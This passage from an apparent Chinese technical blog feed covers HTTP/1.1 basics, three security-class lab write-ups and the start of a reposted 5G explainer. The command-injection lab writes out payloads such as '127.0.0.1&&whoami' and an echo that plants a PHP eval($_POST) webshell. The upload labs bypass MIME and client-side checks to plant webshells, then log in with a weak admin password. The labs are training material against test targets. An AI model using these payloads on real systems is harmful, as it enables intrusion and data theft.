字段</h3></li></ul><p>一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是Content-length字段的作用，声明本次回应的数据长度。<br>Content-Length: 3495<br>上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。<br>在1.0版中，Content-Length字段不是必需的，因为浏览器发现服务器关闭了TCP连接，就表明收到的数据包已经全了。</p><ul><li><h3 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h3></li></ul><p>使用 Content-Length 字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。</p><p>对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送这块数据，不要等待整串数据生成完成后再发送。也就是用”流模式”（stream）取代”缓存模式”（buffer）。<br>因此，1.1版规定可以不使用Content-Length字段，而使用”分块传输编码”（chunked transfer encoding）。只要请求或回应的头信息有Transfer-Encoding字段，就表明回应将由数量未定的数据块组成。</p><p>字段如下所示：</p><pre class="line-numbers language-html"><code class="language-html">Transfer-Encoding: chunked<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每个非空的数据块之前，会有一个 16 进制的数值，表示这个块的长度。最后是一个大小为0的块，就表示本次回应的数据发送完了。下面是一个例子。</p><pre class="line-numbers language-html"><code class="language-html">HTTP/1.1 200 OKContent-Type: text/plainTransfer-Encoding: chunked25This is the data in the first chunk1Cand this is the second one3con8sequence0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3></li></ul><p>1.1版还新增了许多动词方法：PUT、PATCH、HEAD、 OPTIONS、DELETE。另外，客户端请求的头信息新增了Host字段，用来指定服务器的域名。</p><pre class="line-numbers language-html"><code class="language-html">Host: www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有了Host字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。</p><ul><li><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3></li></ul><p>主要还是因为管道机制（pipelining）</p><p>客户端发送 ”请求1“ 时，不需要等待服务端响应了就可以发送 “请求2” 了，但是服务端只有处理完  “请求1” 后才会处理 “请求2”，所以客户端还是需要按照响应的顺序来接收。如果第一个响应很慢，后面就会有很多的请求派对等着，这时就会出现阻塞的情况。专业名称叫做 “线头阻塞” （Head of line blocking）简称：HOLB。</p><p>为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。</p><p>所以，这个 pipelining 仅仅是限于理论场景下，大部分桌面浏览器仍然会选择默认关闭 HTTP pipelining</p><h2 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h2><p><img src="https://i.loli.net/2019/11/07/jKYTmdRpwIDWab4.jpg" alt="HTTP-5.jpg"></p><p>由上图可以看到，http请求由请求行，消息报头，请求正文三部分构成。</p><h3 id="HTTP请求状态行"><a href="#HTTP请求状态行" class="headerlink" title="HTTP请求状态行"></a>HTTP请求状态行</h3><p>请求行由请求Method, URL 字段和HTTP Version三部分构成, 总的来说请求行就是定义了本次请求的请求方式, 请求的地址, 以及所遵循的HTTP协议版本例如：</p><pre class="line-numbers language-html"><code class="language-html">GET /example.html HTTP/1.1 (CRLF)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HTTP协议的方法有： </p><ul><li>GET： 请求获取Request-URI所标识的资源 </li><li>POST： 在Request-URI所标识的资源后增加新的数据 </li><li>HEAD： 请求获取由Request-URI所标识的资源的响应消息报头 </li><li>PUT： 请求服务器存储或修改一个资源，并用Request-URI作为其标识 </li><li>DELETE： 请求服务器删除Request-URI所标识的资源 </li><li>TRACE： 请求服务器回送收到的请求信息，主要用于测试或诊断 </li><li>CONNECT： 保留将来使用 </li><li>OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求</li></ul><h3 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h3><p>消息报头由一系列的键值对组成，允许客户端向服务器端发送一些附加信息或者客户端自身的信息，主要包括：<br>HTTP请求正文</p><p><img src="https://i.loli.net/2019/11/07/ZArFdHW3vptnUqL.jpg" alt="HTTP-6.jpg"></p><p>只有在发送POST请求时才会有请求正文，GET方法并没有请求正文。</p><h2 id="HTTP-响应"><a href="#HTTP-响应" class="headerlink" title="HTTP 响应"></a>HTTP 响应</h2><p>HTTP响应也由三部分组成，包括状态行，消息报头，响应正文。</p><p><img src="https://i.loli.net/2019/11/07/fsiW2ybt4Al5RIK.jpg" alt="HTTP-7.jpg"></p><h3 id="HTTP响应状态行"><a href="#HTTP响应状态行" class="headerlink" title="HTTP响应状态行"></a>HTTP响应状态行</h3><p>状态行也由三部分组成，包括HTTP协议的版本，状态码，以及对状态码的文本描述。例如：</p><pre class="line-numbers language-html"><code class="language-html">HTTP/1.1 200 OK （CRLF）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3><p>状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值： 1xx：指示信息 - 表示请求已接收，继续处理 2xx：成功 - 表示请求已被成功接收、理解、接受 3xx：重定向 - 要完成请求必须进行更进一步的操作 4xx：客户端错误 - 请求有语法错误或请求无法实现 * 5xx：服务器端错误 - 服务器未能实现合法的请求</p><p><img src="https://i.loli.net/2019/11/07/racYudF5JAOiLyH.jpg" alt=" "><br><img src="https://i.loli.net/2019/11/07/bTMCeqhiKa9xmQF.jpg" alt=" "><br><img src="https://i.loli.net/2019/11/07/hPyjpFCeXnzNEx6.jpg" alt=" "><br><img src="https://i.loli.net/2019/11/07/aZycYWtxnFAJf49.jpg" alt=" "></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.zhihu.com/question/35792536" target="_blank" rel="noopener">为什么OSI协议没有普及?</a></p><p><a href="https://www.jianshu.com/p/b51cc1762906" target="_blank" rel="noopener">[HTTP]1.了解TCP/IP</a></p><p><a href="https://blog.csdn.net/zhongshanxian/article/details/80858884" target="_blank" rel="noopener">HTTP工作过程</a></p><p><a href="https://www.zhihu.com/question/52991675" target="_blank" rel="noopener">三次握手和http协议有什么关系吗？</a></p><p><a href="https://blog.csdn.net/qq_25736745/article/details/83374267" target="_blank" rel="noopener">详解Http协议</a></p><p><a href="https://zhuanlan.zhihu.com/p/45173862" target="_blank" rel="noopener">深入理解HTTP协议</a></p><p><a href="http://www.ruanyifeng.com/blog/2016/08/http.html" target="_blank" rel="noopener">HTTP 协议入门</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随堂实验-命令执行</title>
      <link href="/2019/10/29/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/10/29/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>操作机：windows XP</p><p>目标机：windows 2003</p><p>目标地址：<a href="http://172.16.12.2" target="_blank" rel="noopener">http://172.16.12.2</a></p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li><p>学习远程命令执行的原理</p></li><li><p>学习如何分析PHP远程命令执行代码</p></li><li><p>学习如何利用远程命令执行漏洞</p></li></ul><p>目标：</p><p>获取网站根目录下的 flag.php 中的隐藏的信息</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>登陆到 dvwa ，并把安全等级设为 “低”</li></ol><p><img src="https://i.loli.net/2019/10/29/SpXCPiBmJ4Dbsx9.png" alt="command-1.png"></p><ol start="2"><li>测试远程命令执行漏洞</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/eF2kMByYJKTWlhb.png" alt="command-2.png"></p><ol start="3"><li>查看当前目录下有哪些文件</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/Sre2yMXibf8EIlD.png" alt="command-3.png"></p><ol start="4"><li>使用目录遍历命令查找 flag.php 文件</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;for /r C:\phpStudy\WWW %i in (flag)  do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/DmKPvyUwLtB8AfV.png" alt="command-4.png"></p><ol start="5"><li>尝试使用 type 命令查看 flag.php 文件</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;type C:\phpStudy\WWW\flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/ygxUH4VvKC78oTD.png" alt="command-5.png"></p><p>发现无法查看 flag.php 文件</p><ol start="6"><li>尝试查看当前目录下的 index.php</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;type index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/dVTbP5kqhJQjngp.png" alt="command-6.png"></p><p>index.php 文件能够查看，猜测可能是权限问题导致无法访问 flag.php</p><ol start="7"><li>尝试写入 webshell，通过 webshell 来访问文件</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;echo ^<!--? eval(@$_POST['a']) ; ?^--> &gt; test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/1hcz4S2JtqpHM97.png" alt="command-7.png"></p><ol start="8"><li>查看一句话木马是否写入成功</li></ol><pre class="line-numbers language-text"><code class="language-text">127.0.0.1&amp;&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/t2QpLjwiPvl7fgO.png" alt="command-8.png"></p><ol start="9"><li>使用中国菜刀连接 webshell，最后在 WWW 目录下查看 flag.php</li></ol><p><img src="https://i.loli.net/2019/10/29/LoArTEQ4tmVcW6H.png" alt="command-9.png"></p><p><img src="https://i.loli.net/2019/10/29/5CGIbk7Sxh6MoKu.png" alt="command-10.png"></p><p><img src="https://i.loli.net/2019/10/29/7OrUxqsuVyT5evo.png" alt="command-11.png"></p><p><img src="https://i.loli.net/2019/10/29/fhptJuA9d3SCoLr.png" alt="command-14.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/weixin_34082177/article/details/91875850" target="_blank" rel="noopener">命令注入写webshell</a></p><p><a href="https://blog.csdn.net/qq_29647709/article/details/81474552" target="_blank" rel="noopener">Windows命令行(cmd)下快速查找文件</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> Remote command execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随堂实验-文件上传</title>
      <link href="/2019/10/25/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2019/10/25/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>操作机：windows XP</p><p>目标机：Centos6.5</p><p>目标地址：<a href="http://172.16.12.2" target="_blank" rel="noopener">http://172.16.12.2</a></p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>掌握上传绕过服务端 MIME 的原理</p><p>掌握上传绕过服务端MIME的方法</p><p>目标：</p><p>获取web服务器根目录下的flag.php，获取 key 值</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>打开 firefox，输入目标地址</li></ol><p><img src="https://i.loli.net/2019/10/25/nQLa8WSrU6ApxOP.png" alt="file_upload-1.png"></p><ol start="2"><li>注册，并登录用户</li></ol><p><img src="https://i.loli.net/2019/10/25/2ZQwW34BofIbMnz.png" alt="file_upload-2.png"></p><ol start="3"><li>发布投稿</li></ol><p><img src="https://i.loli.net/2019/10/25/PirVJI5MLClKD67.png" alt="file_upload-3.png"></p><ol start="4"><li>上传图片文件</li></ol><p><img src="https://i.loli.net/2019/10/25/6uAwBmZqSt2l9Qe.png" alt="file_upload-4.png"></p><ol start="5"><li>打开源码，查看图片上传的源码，可以看到文件已经上传成功，同时文件名也被改了</li></ol><p><img src="https://i.loli.net/2019/10/25/tqBvOzH3wYQhGIL.png" alt="file_upload-5.png"></p><ol start="6"><li>编写一句话木马<br><img src="https://i.loli.net/2019/10/25/TVCb5tu2hcqlEKN.png" alt="file_upload-6.png"></li></ol><ol start="7"><li>打开 burp suite，查看代理设置</li></ol><p><img src="https://i.loli.net/2019/10/25/IL62PzE8JTj3CYr.png" alt="file_upload-7.png"></p><ol start="8"><li>设置 firefox 代理</li></ol><p><img src="https://i.loli.net/2019/10/25/VreJaNLsQ7X2fPc.png" alt="file_upload-8.png"></p><ol start="9"><li>关闭 burp suite 数据拦截功能</li></ol><p><img src="https://i.loli.net/2019/10/25/JB2mhCOWNY8kcep.png" alt="file_upload-9.png"></p><ol start="10"><li>浏览本地 一句话木马。开启 burp suite 数据拦截功能</li></ol><p><img src="https://i.loli.net/2019/10/25/SsCMidf9UDq7KeR.png" alt="file_upload-10.png"></p><ol start="11"><li>上传 test.php 文件</li></ol><p><img src="https://i.loli.net/2019/10/25/RDxLu8GKrfFHJsT.png" alt="file_upload-11.png"></p><ol start="12"><li>到 burp suite 修改拦截的数据包</li></ol><p><img src="https://i.loli.net/2019/10/25/3EMzZAJWLFR9dIv.png" alt="file_upload-12.png"></p><p><img src="https://i.loli.net/2019/10/25/vno6YabrkMqdJsE.png" alt="file_upload-13.png"></p><ol start="13"><li>burp suite 转发修改后的数据包</li></ol><p><img src="https://i.loli.net/2019/10/25/C96BhflGVxuSwTL.png" alt="file_upload-14.png"></p><ol start="14"><li>查看源码，可以看到木马文件已经上传成功</li></ol><p><img src="https://i.loli.net/2019/10/25/CBUIErGz18XeyZ9.png" alt="file_upload-15.png"></p><ol start="15"><li>打开 中国菜刀，添加shell</li></ol><p><img src="https://i.loli.net/2019/10/25/GcJ7pi62bQxRtHN.png" alt="file_upload-16.png"></p><ol start="16"><li>双击shell，连接到服务器</li></ol><p><img src="https://i.loli.net/2019/10/25/2HahEitzIfRdcXk.png" alt="file_upload-17.png"></p><ol start="17"><li>到根目录下下载 flag.php 文件</li></ol><p><img src="https://i.loli.net/2019/10/25/wDniuz6NfqHa3rS.png" alt="file_upload-18.png"></p><ol start="18"><li>查看文件，并输入 flag</li></ol><p><img src="https://i.loli.net/2019/10/25/PMnvOA2zx6E9UYh.png" alt="file_upload-19.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> file_upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随堂实验(webshell)</title>
      <link href="/2019/10/25/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-webshell/"/>
      <url>/2019/10/25/%E9%9A%8F%E5%A0%82%E5%AE%9E%E9%AA%8C-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>操作机：windows XP</p><p>目标机：windows 2003</p><p>目标地址：<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过 cms 上传漏洞获取 webshell。</p><p>目标：</p><ul><li><p>获取 admin 用户密码</p></li><li><p>获取 C 盘下 flag 文件内容</p></li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>打开 firefox</li></ol><p><img src="https://i.loli.net/2019/10/25/RES9ZckWxrzb1gt.png" alt="webshell-1.png"></p><ol start="2"><li>注册一个 test1 新用户</li></ol><p><img src="https://i.loli.net/2019/10/25/ANeVg71afzE568C.png" alt="webshell-2.png"></p><ol start="3"><li>新建 test.php 文件，编写 php 一句话木马</li></ol><p><img src="https://i.loli.net/2019/10/25/4k9zRWIinFyYaVm.png" alt="webshell-3.png"></p><ol start="4"><li>到个人空间–我的空间–相册–上传新照片。尝试上传 test.php，发现这里做了上传限制 php 文件无法上传。</li></ol><p><img src="https://i.loli.net/2019/10/25/jvasypGmKkionTP.png" alt="webshell-4.png"></p><ol start="5"><li>查看源码，查找验证框架的代码</li></ol><p>从 form 表单中可以看到 onsubmit 元素，它表示表单提交时验证的事件</p><p><img src="https://i.loli.net/2019/10/25/afl35kLKGU9XJSE.png" alt="webshell-5.png"></p><p>再往上找找，能看到 checkFile() 验证事件的代码</p><p><img src="https://i.loli.net/2019/10/25/7xpeNSsry48zVX9.png" alt="webshell-6.png"></p><ol start="6"><li>删除 form 表单中的 onsubmit 元素</li></ol><p><img src="https://i.loli.net/2019/10/25/iIRSHbN7OVwdU9t.png" alt="webshell-7.png"></p><ol start="7"><li>重新上传 test.php</li></ol><p><img src="https://i.loli.net/2019/10/25/PY7QgzvXfMUkAeE.png" alt="webshell-8.png"></p><ol start="8"><li>打开 webshell 工具（中国菜刀），右击添加 shell</li></ol><p><img src="https://i.loli.net/2019/10/25/USoP5ick7CmOjFh.png" alt="webshell-9.png"></p><ol start="9"><li>双击添加的shell，成功连接到服务器上了</li></ol><p><img src="https://i.loli.net/2019/10/25/pYaku4oRPLgUWVZ.png" alt="webshell-10.png"></p><ol start="10"><li>查找 admin 用户的密码</li></ol><p>找了半天，没找到 admin 用户的密码。就在快放弃的的时候突然想到，这是测试环境管理员用户密码基本上都是弱密码，于是抱着尝试的心态用弱口令 “admin” 登录。万万没想到就这样等进去了。</p><p><img src="https://i.loli.net/2019/10/25/ro1HJeaO26ZMUnP.png" alt="webshell-11.png"></p><ol start="11"><li>在 C 盘下获取 flag 文件的内容</li></ol><p>进入 C 盘，看到 “FLAG-SDK……” 的文件</p><p><img src="https://i.loli.net/2019/10/25/ueZJpWoqYzPDkS1.png" alt="webshell-12.png"></p><p>双击文件，直接看到文件内容</p><p><img src="https://i.loli.net/2019/10/25/1K74eFLakWmZCdX.png" alt="webshell-13.png"></p><ol start="12"><li>提交 key 值，实验结束</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> file_upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5G科普</title>
      <link href="/2019/10/20/5G%E7%A7%91%E6%99%AE/"/>
      <url>/2019/10/20/5G%E7%A7%91%E6%99%AE/</url>
      
        <content type="html"><![CDATA[<p>原作者：小枣君</p><p>原出处：鲜枣课堂</p><p>原链接：<a href="https://zhuanlan.zhihu.com/p/40671102" target="_blank" rel="noopener">有史以来最强的5G入门科普！</a></p><h2 id="什么是-5G？"><a href="#什么是-5G？" class="headerlink" title="什么是 5G？"></a>什么是 5G？</h2><p>5G 就是第五代通信技术，主要特点是波长为毫米级，超宽带，超高速度，超低延时。1G 实现了模拟语音通信，大哥大没有屏幕只能打电话；2G 实现了语音通信数字化，功能机有了小屏幕可以发短信了；3G 实现了语音以外图片等的多媒体通信，屏幕变大可以看图片了；4G 实现了局域高速上网，大屏智能机可以看短视频了，但在城市信号好，老家信号差。1G~4G 都是着眼于人与人之间更方便快捷的通信，而 5G 将实现随时、随地、万物互联，让人类敢于期待与地球上的万物通过直播的方式无时差同步参与其中。</p><p><img src="https://pic2.zhimg.com/v2-bf5493f2bb4f63cb829d2071f0bdbd61_r.jpg" alt=""></p><h2 id="一个简单神奇的公式"><a href="#一个简单神奇的公式" class="headerlink" title="一个简单神奇的公式"></a>一个简单神奇的公式</h2><p>所有的通信技术都是围绕一个神奇的公式进行展开的，这个公式蕴含了博大精深的通信技术奥秘。对于这个公式，可以这么说：无论是 1G、2G、3G，还是 4G、5G，万变不离其宗，全部都是在它身上做文章，没有跳出它的“五指山”。</p><p><img src="https://pic1.zhimg.com/v2-223d023ef03d94c6f6557225394d5b7c_r.jpg" alt=""></p><h2 id="有线？无线？"><a href="#有线？无线？" class="headerlink" title="有线？无线？"></a>有线？无线？</h2><p>通信技术，归根到底，就分为两种——有线通信和无线通信。</p><p>有线通信：信息数据在实物上传播（看得见、摸得着）</p><p>无线通信：信息数据在空中传播（看不见、摸不着）</p><p><img src="https://pic4.zhimg.com/v2-55371943c90fd7f095a024d4c30d5213_r.jpg" alt=""></p><p>以光纤为例，在实验室中，单条光纤最大速度已达到了 26Tbps。。。是传统网线的两万六千倍。。。</p><p><img src="https://pic2.zhimg.com/v2-e17e2e9cd5acd0569c78de88647325f5_r.jpg" alt=""></p><p>而空中传播这部分(无线通信)，才是移动通信的瓶颈所在。</p><p>目前主流的移动通信标准，是 4G LTE（3G 的的升级版，并没有真正达到 4G），理论速率只有 150Mbps（不包括载波聚合）。这个和有线是完全没办法相比的。</p><p><img src="https://i.loli.net/2019/10/19/xEh3HfImg927LjZ.jpg" alt=" "></p><p>所以，5G 如果要实现端到端的高速率，重点是突破无线这部分的瓶颈。</p><h2 id="好大一个波"><a href="#好大一个波" class="headerlink" title="好大一个波"></a>好大一个波</h2><p>大家都知道，无线通信就是利用电磁波进行通信。电波和光波，都属于电磁波。电磁波的功能特性，是由它的频率决定的。不同频率的电磁波，有不同的属性特点，从而有不同的用途。</p><p>例如，高频的 γ 射线，具有很大的杀伤力，可以用来治疗肿瘤。</p><p><img src="https://pic4.zhimg.com/80/v2-5d994145ac12cbbca555b6c785e38f03_hd.jpg" alt=""></p><p>我们目前主要使用无线电波进行通信。当然，光波通信也在崛起，例如 LiFi。</p><p><img src="https://pic2.zhimg.com/80/v2-49b17811ba99fdec01d486e9bf883a21_hd.jpg" alt=""></p><p>不偏题，回到无线电波先。</p><p>无线电波属于电磁波的一种，它的频率资源是有限的。为了避免干扰和冲突，我们在电波这条公路上进一步划分车道，分配给不同的对象和用途。</p><p>请大家注意下面图中的红色字体。一直以来，我们主要是用中频~超高频进行手机通信的。</p><p><img src="https://pic2.zhimg.com/80/v2-d2cdd772163befe3752f96bb87d5861d_hd.jpg" alt=""></p><p>目前全球主流的 4G LTE 技术标准，属于特高频和超高频。</p><p>我们国家主要使用超高频：</p><p><img src="https://i.loli.net/2019/10/19/LI6HN4DbMnmOfdJ.jpg" alt=" "></p><p>大家能看出来，随着 1G、2G、3G、4G 的发展，使用的电波频率是越来越高的。这是为什么呢？</p><p>这主要是因为，频率越高，能使用的频率资源越丰富。频率资源越丰富，能实现的传输速率就越高。简单来说，频率资源就像车厢，越高的频率，车厢越多，相同时间内能装载的信息就越多。</p><p><img src="https://i.loli.net/2019/10/19/eF2N4ab3VRW9Pil.jpg" alt=" "></p><p>那么，5G使用的频率具体是多少呢？如下图所示：</p><p><img src="https://pic2.zhimg.com/80/v2-fc333497812a58500b7b7370ea9d11e5_hd.jpg" alt=""></p><p>5G的频率范围，分为两种：一种是 6GHz 以下，这个和目前我们的 2/3/4G 差别不算太大。还有一种，就很高了，在 24GHz 以上。</p><p>目前，国际上主要使用 28GHz 进行试验（这个频段也有可能成为5G最先商用的频段）。</p><p>如果按 28GHz 来算，根据前文我们提到的公式：</p><p><img src="https://i.loli.net/2019/10/19/sYged1NUzHjcV9M.jpg" alt=" "></p><p>好啦，这个就是5G的第一个技术特点—频率越高，传输速率越高（带宽越大）</p><h2 id="毫米波"><a href="#毫米波" class="headerlink" title="毫米波"></a>毫米波</h2><p>请允许我再发一遍刚才那个频率对照表：</p><p><img src="https://pic2.zhimg.com/80/v2-d2cdd772163befe3752f96bb87d5861d_hd.jpg" alt=""></p><p>请注意看最下面一行，是不是就是“毫米波”？</p><p>从上面可以了解到无线电波的频率越高，网络的传输速率越快。</p><p>那么问题来了：既然频率越高，传输速率越高（手机网速越快），为什么以前我们不用高频率呢？</p><p>其实原因很简单——不是不想用，是用不起。</p><p>首先无线电波在空中的传播方式可分为以下几种</p><ul><li><strong>直射</strong></li></ul><p>类比：在台球这项运动中，很多规律很像电磁波的规律。假若直接撞击球中心打出去的时候假使没有任何阻挡，球将沿直线运行</p><p>由发射天线沿直线到达接收点的无线电波，被称为直射波。自由空间电波传播是电波在真空中的传播，是一种理想传播条件。 电波在自由空间传播时，可以认为是直射波传播，其能量既不会被障碍物吸收，也不会产生反射或散射。</p><ul><li><strong>反射</strong></li></ul><p>类比：如果打出的球碰到的台边，它就按 照反射角等入射角的规律运行。</p><p>应用：在高速铁路无线覆盖选站的时候，要关注无线电波的入射角问题。备选站址不能太远，否则入射角太大，进入车厢内的折射能力就减少。一般都选取离铁路100米左右的站址（还需考虑其他因素，以后说）。<br>无线信号是通过地面或其他障碍物反射到达接收点的，称为反射波。反射发生于地球表面、建筑物和墙壁表面。反射波是在两种密度不同的传播媒介的分界面中才会 发生，分界面媒质密度差越大，波的反射量越大，折射量越小。波的入射角越小，反射量越小，折射量越大。直射波和反射波合称为空间波。</p><ul><li><strong>绕射</strong></li></ul><p>类比：假若母球和另一个球相切，根据力度和方向，它可以绕过视距内球，很像绕射</p><ul><li><strong>散射</strong></li></ul><p>类比：假设在一个范围内的很多球的彼此间距不超过一个 球，当母球打到这些球中间，会激起很多球向不同方向运动，很像散射</p><p>当无线电波穿行的介质中存在小于波长的物体，且单位体积内阻挡体的个数非常巨大时，发生散射； 散射波产生于粗糙表面，小物体或其他不规则物体。在实际的通信系统中，树叶、街道标志和灯柱等会引发散射。</p><ul><li><strong>穿透</strong></li></ul><p>类比：水从沙子中穿过，沙子吸收水分，最后流出来的水变得很少</p><p>对于非理想介质，无线电波贯穿介质，即穿透时，介质会吸收电磁波的能量，产生贯穿衰落。穿透损耗大小不仅与电磁波频率有关，而且与穿透物体的材料、尺寸有关。</p><ul><li><strong>非视距传输</strong></li></ul><p>趣事：<br>在工科大学读书的时候，女生很少，大家对女性的生活感到非常神秘。幸运的是，和我们男生宿舍楼成直角的就是一个女生宿舍楼，而且水房就在靠近男生楼 这一端。夏天的时候，只能听到水声，却看不到。一个同学说：“哎，可惜是非视距传输。”过了不多久，就发现该同学很创意般的在不远的墙上装了一个反射镜， 此君用望远镜每天看半小时。最终被女生发现。</p><p>无线信号从发射点到接收端有障碍物阻挡，不能沿直线进行传播，叫做非视距传输。非视距传输的无线传播损耗比视距传输要增加很多。</p><p>一般室内的无线电波信号是穿透分量与绕射分量的叠加，而绕射分量占绝大部分，但是频率越高，波长越短，越趋近于直线传播，绕射能力越差，穿透能力越强。简单来说就是频率越高，室内的无线电波的传播方式就会以穿透方式为主（当然室外也一样），然而无线电波穿透时，介质会吸收无线电波的能量，产生贯穿衰落。</p><p>这个就是 5G 的第二个特点—频率越高，损减越大，传输距离越短。</p><p>因此移动通信如果用了高频段，那么它最大的问题，就是传输距离大幅缩短，覆盖能力大幅减弱。覆盖同一个区域，需要的 5G 基站数量，将大大超过 4G。</p><p><img 